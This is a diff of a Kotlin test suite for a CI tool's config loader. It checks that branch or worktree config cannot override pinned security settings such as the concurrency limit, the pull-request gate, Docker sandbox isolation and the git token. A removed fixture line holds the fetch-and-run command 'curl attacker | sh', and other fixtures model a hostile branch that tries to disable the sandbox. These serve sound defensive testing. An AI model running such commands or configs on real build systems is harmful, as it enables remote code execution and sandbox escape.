@@ -92,13 +92,45 @@ class ConfigLoaderTest : FunSpec() {
             loader.load(dir).effectiveBuildDefinitions()["default"] shouldBe BuildDefinition(onPush = false)
         }
 
-        test("a build worktree cannot redefine the builds section") {
+        test("a branch may redefine the builds section for its own builds") {
             val dir = Files.createTempDirectory("gittally-test")
             dir.resolve(".gittally.yml").toFile().writeText(
                 """
                 builds:
                   pitest:
+                    atTimes: ["01:00"]
+                    buildCommand: ./gradlew piTestPartial
+                """.trimIndent(),
+            )
+            val worktree = Files.createTempDirectory("gittally-test-worktree")
+            worktree.resolve(".gittally.yml").toFile().writeText(
+                """
+                builds:
+                  pitest:
                     buildCommand: ./gradlew piTestFull
+                  experiment:
+                    onPush: true
+                """.trimIndent(),
+            )
+
+            val config = loader.loadForWorktree(dir, worktree)
+
+            // the branch layer merges into the definition instead of replacing it
+            config.buildDefinitions.getValue("pitest").buildCommand shouldBe "./gradlew piTestFull"
+            config.buildDefinitions.getValue("pitest").atTimes shouldBe listOf("01:00")
+            config.buildDefinitions.getValue("experiment").onPush shouldBe true
+        }
+
+        test("a branch cannot raise the concurrency limit or reach the sandbox policy through a build definition") {
+            val dir = Files.createTempDirectory("gittally-test")
+            dir.resolve(".gittally.yml").toFile().writeText(
+                """
+                branches:
+                  default:
+                    requirePullRequest: true
+                    docker:
+                      enabled: true
+                      network: none
                 """.trimIndent(),
             )
             val worktree = Files.createTempDirectory("gittally-test-worktree")
@@ -106,16 +138,36 @@ class ConfigLoaderTest : FunSpec() {
                 """
                 executor:
                   maxConcurrent: 99
+                watcher:
+                  pullRequestGate: false
+                branches:
+                  default:
+                    requirePullRequest: false
                 builds:
-                  pitest:
-                    buildCommand: curl attacker | sh
+                  default:
+                    docker:
+                      enabled: false
+                      network: host
                 """.trimIndent(),
             )
 
             val config = loader.loadForWorktree(dir, worktree)
+            val branchConfig = config.branches.getValue("default")
 
             config.executor.maxConcurrent shouldBe 1
-            config.buildDefinitions.getValue("pitest").buildCommand shouldBe "./gradlew piTestFull"
+            config.watcher.pullRequestGate shouldBe true
+            branchConfig.requirePullRequest shouldBe true
+            // a build definition has no enabled/network at all, so it cannot reintroduce them
+            config.buildDefinitions
+                .getValue("default")
+                .applyTo(branchConfig)
+                .docker
+                .enabled shouldBe true
+            config.buildDefinitions
+                .getValue("default")
+                .applyTo(branchConfig)
+                .docker
+                .network shouldBe "none"
         }
 
         test("repo install config overrides project config for same keys") {
@@ -310,6 +362,54 @@ class ConfigLoaderTest : FunSpec() {
             config.branches["default"]!!.docker.network shouldBe "host"
             // overridable: the worktree wins
             config.branches["default"]!!.docker.image shouldBe "attacker-image"
+        }
+
+        test("loadWithBranchLayer applies a branch config read from git, pinning the same keys") {
+            val dir = Files.createTempDirectory("gittally-test")
+            dir.resolve(".git/gittally").toFile().mkdirs()
+            dir.resolve(".git/gittally/.gittally.yml").toFile().writeText(
+                """
+                git:
+                  token: real-secret
+                branches:
+                  default:
+                    buildCommand: from-git
+                """.trimIndent(),
+            )
+
+            val config =
+                loader.loadWithBranchLayer(
+                    dir,
+                    """
+                    git:
+                      token: stolen
+                    builds:
+                      pitest:
+                        atTimes: ["03:00"]
+                        buildCommand: ./gradlew piTestFull
+                    branches:
+                      default:
+                        buildCommand: from-branch
+                    """.trimIndent(),
+                )
+
+            config.git.token shouldBe "real-secret"
+            config.branches.getValue("default").buildCommand shouldBe "from-branch"
+            config.buildDefinitions.getValue("pitest").atTimes shouldBe listOf("03:00")
+        }
+
+        test("loadWithBranchLayer without a branch config equals load") {
+            val dir = Files.createTempDirectory("gittally-test")
+            dir.resolve(".gittally.yml").toFile().writeText(
+                """
+                branches:
+                  default:
+                    buildCommand: ./mvnw test
+                """.trimIndent(),
+            )
+
+            loader.loadWithBranchLayer(dir, null) shouldBe loader.load(dir)
+            loader.loadWithBranchLayer(dir, "") shouldBe loader.load(dir)
         }
 
         test("loadForWorktree without a worktree config equals load") {
